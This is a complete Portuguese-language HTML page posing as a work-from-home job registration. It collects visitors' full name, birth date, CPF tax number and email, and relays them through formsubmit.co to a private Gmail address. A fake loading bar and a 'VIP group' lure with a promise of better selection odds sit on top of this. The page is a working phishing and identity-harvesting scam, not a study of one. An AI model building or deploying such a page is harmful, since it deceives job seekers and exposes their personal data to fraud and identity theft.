<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Cadastro Profissional</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #83a4d4, #b6fbff);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 420px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #333;
    }
    label {
      display: block;
      margin-top: 12px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 14px;
      margin-top: 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }

    .carregando, .mensagem-final, .formulario-container {
      display: none;
      text-align: center;
      margin-top: 20px;
    }

    .barra {
      width: 100%;
      background-color: #ddd;
      border-radius: 10px;
      overflow: hidden;
      height: 20px;
      margin-top: 20px;
    }

    .progresso {
      height: 100%;
      width: 0%;
      background-color: #007bff;
      animation: carregar 3s linear forwards;
    }

    @keyframes carregar {
      0% { width: 0%; }
      100% { width: 100%; }
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Comece agora como Home Office</h2>

  <div class="formulario-container" id="formularioContainer">
    <form id="formularioReal" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="about:blank">

      <label for="nome">Nome completo</label>
      <input type="text" id="nome" name="nome" required>

      <label for="data">Data de nascimento</label>
      <input type="date" id="data" name="data_nascimento" required>

      <label for="cpf">CPF</label>
      <input type="text" id="cpf" name="cpf" required>

      <label for="email">E-mail</label>
      <input type="email" id="email" name="email_usuario" required>

      <label for="grupo">Deseja participar do nosso grupo VIP com acesso exclusivo e barato?</label>
      <select id="grupo" name="grupo_vip" required>
        <option value="" disabled selected>Selecione</option>
        <option value="Sim">Sim</option>
        <option value="Não">Não</option>
      </select>

      <p style="font-size: 13px; color: #555; margin-top: 10px;">
        No grupo VIP, você terá acesso antecipado a várias oportunidades e maior chance de ser selecionado.
      </p>

      <button type="submit" id="botaoEnviar">Enviar cadastro</button>
    </form>
  </div>

  <div class="carregando" id="carregando">
    <p>Enviando informações...</p>
    <div class="barra">
      <div class="progresso"></div>
    </div>
  </div>

  <div class="mensagem-final" id="mensagemFinal">
    <h3>✅ Cadastro Enviado</h3>
    <p>Obrigado! Seus dados estão em análise.<br>Em breve entraremos em contato por e-mail.</p>
  </div>
</div>

<script>
  // Exibe o formulário ao carregar a página
  document.getElementById("formularioContainer").style.display = "block";

  document.getElementById("formularioReal").addEventListener("submit", function (e) {
    e.preventDefault(); // impede o envio direto

    // Oculta o formulário e mostra a barra de carregamento
    document.getElementById("formularioContainer").style.display = "none";
    document.getElementById("carregando").style.display = "block";

    // Após 3 segundos, mostra a mensagem final e envia o formulário
    setTimeout(() => {
      document.getElementById("carregando").style.display = "none";
      document.getElementById("mensagemFinal").style.display = "block";

      // Cria um formulário oculto e envia
      const form = document.getElementById("formularioReal");
      form.submit();
    }, 3000);
  });
</script>

</body>
</html>
